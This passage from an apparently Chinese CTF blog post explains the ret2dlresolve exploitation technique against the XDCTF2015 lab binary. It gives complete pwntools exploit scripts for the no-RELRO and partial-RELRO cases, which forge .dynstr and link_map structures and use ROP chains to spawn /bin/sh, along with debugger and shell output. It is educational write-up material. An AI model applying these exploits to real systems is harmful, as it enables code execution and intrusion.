class="line">pwndbg&gt; tele 0x403130 30</span><br><span class="line">...</span><br><span class="line">11:0088│  0x4031b8 (_DYNAMIC+136) —▸ 0x400478 ◂— 0x7277006461657200  </span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure>

<p><img src="/images/re2dl-exp1.png"></p>
<p>以上是示意图，exp如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">"pwn"</span></span><br><span class="line">libcname = <span class="string">"/home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6_2.35-0ubuntu3.10_amd64/lib/x86_64-linux-gnu/libc.so.6"</span></span><br><span class="line">host = <span class="string">"127.0.0.1"</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">'''</span></span><br><span class="line"><span class="string">b main</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6-dbg_2.35-0ubuntu3.10_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/glibc-source_2.35-0ubuntu3.10_all/usr/src/glibc/glibc-2.35</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>] </span><br><span class="line">strtab = <span class="number">0x4031b8</span></span><br><span class="line">plt0 = <span class="number">0x401020</span>   </span><br><span class="line">pop_rdi_ret = <span class="number">0x4011d5</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x4011d7</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x4011d9</span></span><br><span class="line"></span><br><span class="line">fake_dynstr = <span class="string">b'\x00read\x00write\x00__libc_start_main\x00'</span> + \</span><br><span class="line">    <span class="string">b'stdout\x00system\x00stdin\x00setbuf\x00libc.so.6\x00GLIBC_2.2.5\x00'</span> + \</span><br><span class="line">    <span class="string">b'GLIBC_2.34\x00__gmon_start__\x00'</span> <span class="comment"># 'strlen' 替换为 'system'</span></span><br><span class="line">bss = <span class="number">0x403360</span> </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">0x78</span> + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + \</span><br><span class="line">        p64(bss + <span class="number">0x400</span>) + p64(pop_rdx_ret) + p64(<span class="number">0x100</span>) + p64(read_plt) + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + \</span><br><span class="line">        p64(pop_rsi_ret) + p64(strtab) + p64(read_plt) + p64(pop_rdi_ret) + \</span><br><span class="line">        p64(bss + <span class="number">0x400</span>) + p64(plt0) + p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>, <span class="string">b'\x00'</span>)) <span class="comment"># 写入 ROP_chain</span></span><br><span class="line">payload = <span class="string">b'/bin/sh\x00'</span> + fake_dynstr </span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>, <span class="string">b'\x00'</span>)) <span class="comment"># 写入 fake_dynstr</span></span><br><span class="line">io.sendline(p64(bss + <span class="number">0x408</span>)) <span class="comment">#写入 fake_dynstr 地址</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>

<p>注意这里<code>plt0</code>后的<code>1</code>是<code>dl_runtime</code>函数的第二个参数<code>reloc_arg</code>（仍然是栈传参），其第一个参数<code>link_map</code>在<code>plt0</code>的第一条指令<code>push link_map</code>传递<br>这个<code>reloc_arg</code>是一个索引，作为 <code>.rela.plt</code>的下标，然后再从该条目里读出 <code>r_offset</code>，才知道要解析哪个<code>GOT</code>表项，这里传递<code>1</code>。方便判断，大概满足</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PLT 表项 N → reloc_arg = N-1</span><br></pre></td></tr></tbody></table></figure>

<p>这里<code>strlen</code>在<code>plt</code>中是第<strong>2</strong>项，所以传入<strong>1</strong>即可</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; plt</span><br><span class="line">Section .plt 0x401020 - 0x401070:</span><br><span class="line">No symbols found in section .plt</span><br><span class="line">Section .plt.sec 0x401070 - 0x4010b0:</span><br><span class="line">0x401070: write@plt</span><br><span class="line">0x401080: strlen@plt</span><br><span class="line">0x401090: setbuf@plt</span><br><span class="line">0x4010a0: read@plt</span><br></pre></td></tr></tbody></table></figure>

<p>效果</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b'ls\n'</span><br><span class="line">[DEBUG] Received 0x12 bytes:</span><br><span class="line">    b'exp.py\tpwn  pwn.c\n'</span><br><span class="line">exp.py  pwn  pwn.c</span><br><span class="line">$</span><br></pre></td></tr></tbody></table></figure>

<h4 id="PARTIAL-RELRO"><a href="#PARTIAL-RELRO" class="headerlink" title="PARTIAL RELRO"></a>PARTIAL RELRO</h4><p>64 位下伪造时（<code>.bss</code> 段离 <code>.dynsym</code> 太远） <code>reloc-&gt;r_info</code> 也很大，最后使得访问 <code>ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</code> 时程序访存出错，导致程序崩溃。因此我们退而求其次选择 <code>ELFW(ST_VISIBILITY) (sym-&gt;st_other)</code> 不为 0 时时的程序执行流程，此时计算的目标函数地址为 <code>l-&gt;l_addr + sym-&gt;st_value</code> 。<br>虽然这种方法<strong>无法在不知道 <code>libc</code> 版本的情况下完成利用，但是可以在不泄露 <code>libc</code> 基址的情况下完成利用，以及elf基址要固定</strong>。<br>我们需要作如下构造：</p>
<ul>
<li><p><code>resolve</code> 函数传入的第二个参数为 0 ，从而从 <code>Elf64_Rel</code> 数组中找到第一个 <code>Elf64_Rel</code> 。 </p>
</li>
<li><p>为了避免更新 <code>got</code> 表时内存访问错误，<code>Elf64_Rel</code> 的 <code>r_offset</code> 加上 <code>link_map-&gt;l_addr</code> 需要指向可读写内存。 </p>
</li>
<li><p><code>Elf64_Rel</code> 的 <code>r_info</code> 的低 32 比特设置为 <code>ELF_MACHINE_JMP_SLOT</code> 即 7 。 </p>
</li>
<li><p>为了避免下面这行代码访存错误，需要让 <code>l_info[5]</code> 指向可读写内存。</p>
</li>
</ul>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br></pre></td></tr></tbody></table></figure>

<ul>
<li><p><code>Elf64_Rel</code> 的 <code>r_info</code> 的高 32 比特设置为 0 这样找的就是 <code>Elf64_Sym</code> 数组中的第一个 <code>Elf64_Sym</code> 。 </p>
</li>
<li><p><code>link_map-&gt;l_info[6]-&gt;d_un.dptr</code> 指向 <code>func@got - 8</code> 这样就伪造出 <code>Elf64_Sym</code> 的 <code>st_value</code> 为 <code>func</code> 函数地址，同时 <code>st_order</code> 也大概率为非 0 。 </p>
</li>
<li><p><code>link_map</code> 的 <code>l_addr</code> 设置为 <code>&amp;system - &amp;func</code> ，这样 <code>l-&gt;l_addr + sym-&gt;st_value</code> 结果就是 <code>system</code> 函数地址。</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance  (_rtld_global._dl_ns[0]._ns_loaded)  &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[5])</span><br><span class="line">0x7ffff7ffe2e0-&gt;0x7ffff7ffe348 is 0x68 bytes (0xd words)</span><br><span class="line">pwndbg&gt; distance  (_rtld_global._dl_ns[0]._ns_loaded)  &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[6])</span><br><span class="line">0x7ffff7ffe2e0-&gt;0x7ffff7ffe350 is 0x70 bytes (0xe words)</span><br><span class="line">pwndbg&gt; distance  (_rtld_global._dl_ns[0]._ns_loaded)  &amp;((_rtld_global._dl_ns[0]._ns_loaded)-&gt;l_info[23])</span><br><span class="line">0x7ffff7ffe2e0-&gt;0x7ffff7ffe3d8 is 0xf8 bytes (0x1f words)</span><br></pre></td></tr></tbody></table></figure>

<p><code>l_info[DT_STRTAB/5]</code>指针：位于<code>link_map_addr +0x68</code><br><code>l_info[DT_SYMTAB/6]</code>指针：位于<code>link_map_addr + 0x70</code><br><code>l_info[DT_JMPREL/23]</code>指针：位于<code>link_map_addr +0xF8</code><br>示意图如下</p>
<p><img src="/images/re2dl-exp2.png"></p>
<p>exp如下</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">"pwn2"</span></span><br><span class="line">libcname = <span class="string">"/home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6_2.35-0ubuntu3.10_amd64/lib/x86_64-linux-gnu/libc.so.6"</span></span><br><span class="line">host = <span class="string">"127.0.0.1"</span></span><br><span class="line">port = <span class="number">1337</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">'''</span></span><br><span class="line"><span class="string">b main</span></span><br><span class="line"><span class="string">set debug-file-directory /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/libc6-dbg_2.35-0ubuntu3.10_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/r3t2/.config/cpwn/pkgs/2.35-0ubuntu3.10/amd64/glibc-source_2.35-0ubuntu3.10_all/usr/src/glibc/glibc-2.35</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.P:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">elif</span> args.R:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript = gs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>] </span><br><span class="line">plt0 = <span class="number">0x401020</span>   </span><br><span class="line">pop_rdi_ret = <span class="number">0x4011d5</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x4011d7</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x4011d9</span></span><br><span class="line">resolve = <span class="number">0x401026</span></span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x404050</span></span><br><span class="line">fake_link_map_addr = bss + <span class="number">0x400</span></span><br><span class="line">binsh = fake_link_map_addr + <span class="number">0x50</span></span><br><span class="line">offset = libc.sym[<span class="string">'system'</span>] - libc.sym[<span class="string">'read'</span>] <span class="comment"># 选择一个已解析的函数</span></span><br><span class="line">fake_link_map = p64(offset &amp; <span class="number">0xffffffffffffffff</span>) <span class="comment"># 需要这样调整一下否则 p64() 会报错</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x10</span>, <span class="string">b'\x00'</span>) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">'read'</span>] - <span class="number">0x8</span>)</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x20</span>, <span class="string">b'\x00'</span>) + p64((bss - offset) &amp; <span class="number">0xffffffffffffffff</span>) + p32(<span class="number">7</span>) + p32(<span class="number">0</span>)  <span class="comment"># 此处 r_offset + l_addr 为可读写地址即可</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x40</span>, <span class="string">b'\x00'</span>) + p64(<span class="number">0</span>) + p64(fake_link_map_addr + <span class="number">0x20</span>)</span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x50</span>, <span class="string">b'\x00'</span>) + <span class="string">b'/bin/sh\x00'</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x68</span>, <span class="string">b'\x00'</span>) + p64(bss) <span class="comment"># l_info[5] -&gt; 可读写地址即可</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0x70</span>, <span class="string">b'\x00'</span>) + p64(fake_link_map_addr + <span class="number">0x10</span>) <span class="comment"># l_info[6]</span></span><br><span class="line">fake_link_map = fake_link_map.ljust(<span class="number">0xf8</span>, <span class="string">b'\x00'</span>) + p64(fake_link_map_addr + <span class="number">0x40</span>) <span class="comment"># l_info[23]</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">0x78</span> + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + \</span><br><span class="line">        p64(fake_link_map_addr) + p64(pop_rdx_ret) + p64(<span class="number">0x100</span>) + p64(read_plt) + \</span><br><span class="line">        p64(pop_rdi_ret) + p64(binsh) + p64(resolve) + p64(fake_link_map_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b'Welcome to XDCTF2015~!\n'</span>)</span><br><span class="line">io.send(payload.ljust(<span class="number">0x100</span>, <span class="string">b'\x00'</span>)) </span><br><span class="line">io.send(fake_link_map.ljust(<span class="number">0x100</span>, <span class="string">b'\x00'</span>))</span><br><span class="line"> </span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>

<p><strong>不要用<code>strlen</code>来算和<code>system</code>的偏移</strong>，这个函数符号有点怪，等什么时候探究一下<br>仍然可能需要注意一下栈对齐<br>效果如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b'ls\n'</span><br><span class="line">[DEBUG] Received 0x21 bytes:</span><br><span class="line">    b'exp.py\texp2.py  pwn  pwn.c  pwn2\n'</span><br><span class="line">exp.py  exp2.py  pwn  pwn.c  pwn2</span><br><span class="line">$</span><br></pre></td></tr></tbody></table></figure>

<h4 id="FULL-RELRO"><a href="#FULL-RELRO" class="headerlink" title="FULL RELRO"></a>FULL RELRO</h4><p>洗洗睡吧</p>
<h4 id="pwntools一把梭"><a href="#pwntools一把梭" class="headerlink" title="pwntools一把梭"></a>pwntools一把梭</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x78</span> <span class="comment">#距返回地址的偏移</span></span><br><span class="line">read_length = <span class="number">0x100</span> <span class="comment">#最大读取长度</span></span><br><span class="line"></span><br><span class="line">rop = ROP(elf)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="string">'system'</span>, args=[<span class="string">"/bin/sh"</span>])</span><br><span class="line"></span><br><span class="line">rop.read(<span class="number">0</span>, dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line"></span><br><span class="line">payload = flat({offset:raw_rop, read_length:dlresolve.payload})</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></tbody></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://fuckth3w0r1d.github.io">r3t2</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://fuckth3w0r1d.github.io/2025/09/10/%E5%85%B3%E4%BA%8Eret2dlresolve/">https://fuckth3w0r1d.github.io/2025/09/10/%E5%85%B3%E4%BA%8Eret2dlresolve/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://fuckth3w0r1d.github.io" target="_blank">r3t2's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a></div><div class="post-share"><div class="social-share" data-image="/img/saber_flower.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/09/08/%E4%BB%8E%E4%B8%80%E4%B8%AA%E9%97%AE%E9%A2%98%E5%87%BA%E5%8F%91%E7%9A%84%E5%85%B3%E4%BA%8Eprintf%E4%B8%AD%E5%A4%84%E7%90%86fmtstr%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="从一个问题出发的关于printf中处理fmtstr部分源码分析"><img class="cover" src="/img/dio.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">从一个问题出发的关于printf中处理fmtstr部分源码分析</div></div><div class="info-2"><div class="info-item-1">0x00在第六届强网拟态线下赛的一道格式化字符串漏洞题目中，遇到了一个情况没有想通，找了个时间分析了一下 printf的源码（glibc2.31），分析清楚原因了 0x01 issue奇怪合理的现象 123payload = '%{}c'.format(printf_ret).encode() + b"%11$hn" + \        '%{}c'.format(0x10000 - printf_ret + 0x23).encode() + b"%39$hhn"io.send(payload)  最初我是这样写的，调试发现仅仅成功修改了跳板，而目标，也就是printf的返回地址却没有修改到 123payload = b'%p'*9 + '%{}c'.format(printf_ret - 90).encode() + b"%hn" + \       ...</div></div></div></a><a class="pagination-related" href="/2025/09/12/%E5%85%B3%E4%BA%8Ehouse-of-cat/" title="关于house of cat"><img class="cover" src="/img/dio.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">关于house of cat</div></div><div class="info-2"><div class="info-item-1">0x00湾区杯被堆题斩于马下，赛后找到powchan的exp，利用堆风水打house of cat，并且相比于板子，更特殊的点就是打stdout并修改mode为**-1**，不需要__malloc_assert、exit或者是fflush来触发。另一个题解则是打libc-got姑且先学习一下常规的house of cat参考博客  https://bbs.kanxue.com/thread-273895.htm  https://nicholas-wei.github.io/2022/08/02/house-of-cat/  https://zikh26.github.io/posts/7de5a5b7.html   本文贴出源码无特别提及皆为glibc2.35 0x01 __malloc_assert正常情况下，glibc 的断言失败会走 __assert_fail（在 &lt;assert.h&gt; 里定义）。而在 malloc 的时候，它单独定义了一个版本，走 __malloc_assert，这样方便在 malloc...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/07/04/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%B8%8Bglibc%E6%9C%89%E5%85%B3%E5%A0%86%E7%9A%84%E7%AE%A1%E7%90%86%E5%92%8C%E4%BF%9D%E6%8A%A4/" title="不同版本下glibc有关堆的管理和保护"><img class="cover" src="/img/saber_flower.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-04</div><div class="info-item-2">不同版本下glibc有关堆的管理和保护</div></div><div class="info-2"><div class="info-item-1">0x00记录一下不同版本glibc下的堆管理保护机制的变化(开个坑，以后慢慢记录补充先贴上几篇参考博客不同版本glibc的堆管理和新增保护机制 - Luexpglibc各版本的堆保护 | jkilopu’s blogGlibc中堆管理的变化 | 白里个白Glibc高版本堆利用方法总结 - LynneHuan - 博客园然后ubuntu和glibc不同版本的对应关系 12345678910111213ubuntu-libc version2.23=“16.04”2.24=“17.04”2.26=“17.10”2.27=“18.04”2.28=“18.10”2.29=“19.04”2.30=“19.10”2.31=“20.04”2.32=“20.10”2.33=“21.04”2.34=“22.04”  0x01 关于tcachebins在glibc2.26+，引入了tcachebins有两个比较关键的函数tcache_get()和tcache_put()(以下为glibc2.28中的源码) 1234567891011121314151617181920static...</div></div></div></a><a class="pagination-related" href="/2025/07/07/malloc%E4%BD%8D%E4%BA%8E%E6%A0%88%E4%B8%8A%E7%9A%84chunk/" title="malloc位于栈上的chunk"><img class="cover" src="/img/dio.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-07</div><div class="info-item-2">malloc位于栈上的chunk</div></div><div class="info-2"><div class="info-item-1">0x00 Background笔者打nssctf上的一题，记录一下。pwn攻击不应该孤立的看。换句话说，要无所不用其极，哪种攻击好使就用哪种。现在就来浅浅分析一下在堆中对栈的攻击。（手法很多，后面慢慢学慢慢补充吧 0x01 利用environ变量以下调试以[NSSRound#21Basic]want_girlfriend（glibc2.35）的程序来演示。在linux环境下，程序存在一个全局变量(char**)environ，位于 libc 数据段，与 libc_base 存在固定偏移 1environ_addr=libcbase+libc.sym["environ"]  environ指向一个指针数组，数组中每个指针指向一个环境变量字符串，而环境变量字符串是位于栈区的。 1234pwndbg&gt; p &amp;environ$1 = (&lt;data variable, no debug info&gt; *) 0x7ffff7e22200 &lt;environ&gt;pwndbg&gt; x/gx...</div></div></div></a><a class="pagination-related" href="/2025/07/04/%E5%8A%AB%E6%8C%81tcache-perthread-struct/" title="劫持tcache_perthread_struct"><img class="cover" src="/img/dio.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-04</div><div class="info-item-2">劫持tcache_perthread_struct</div></div><div class="info-2"><div class="info-item-1">0x00 关于tcache_perthread_structtcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能，与 fastbin 类似。 tcache 引入了两个新的结构体，tcache_entry和 tcache_perthread_struct 。两个结构体源码如下 12345678910typedef struct tcache_entry{  struct tcache_entry *next;} tcache_entry;typedef struct tcache_perthread_struct{  char counts[TCACHE_MAX_BINS];//0x40  tcache_entry *entries[TCACHE_MAX_BINS];//0x40} tcache_perthread_struct;  12TCACHE_MAX_BINS:# define TCACHE_MAX_BINS       ...</div></div></div></a><a class="pagination-related" href="/2025/07/27/%E5%85%B3%E4%BA%8E-IO-FILE/" title="关于_IO_FILE"><img class="cover" src="/img/dio.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-27</div><div class="info-item-2">关于_IO_FILE</div></div><div class="info-2"><div class="info-item-1">0x00总结记录一下_IO_FILE的基础知识参考博客linux IO_FILE 利用_io list all结构体-CSDN博客【IO_FILE】源码详解 | Loora1N’s Blog | 鹭雨【PWN】iofile | 狼组安全团队公开知识库 0x01 _IO_FILE结构FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。FILE 结构定义在 libio.h 中，如下所示 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566struct _IO_FILE {  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */#define...</div></div></div></a><a class="pagination-related" href="/2025/07/27/%E5%85%B3%E4%BA%8Ehouse-of-apple/" title="关于house of apple"><img class="cover" src="/img/saber_flower.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-07-27</div><div class="info-item-2">关于house of apple</div></div><div class="info-2"><div class="info-item-1">0x00在复现LitCTF2024的heap-2.39时候遇到了house of apple，既然碰到了，那么就学习一下吧！（其实在上学期校赛的时候就碰到了） 0x01 house of apple 原理先贴上roderick01师傅的原创文章镇帖（[原创] House of apple 一种新的glibc中IO攻击方法 (1)-Pwn-看雪-安全社区|安全招聘|kanxue.com[原创] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪-安全社区|安全招聘|kanxue.com[原创]House of apple 一种新的glibc中IO攻击方法 (3)-Pwn-看雪-安全社区|安全招聘|kanxue.com 我们调试demo （姑且先看apple2） _IO_wfile_overflow1234_IO_wfile_overflow    _IO_wdoallocbuf        _IO_WDOALLOCATE            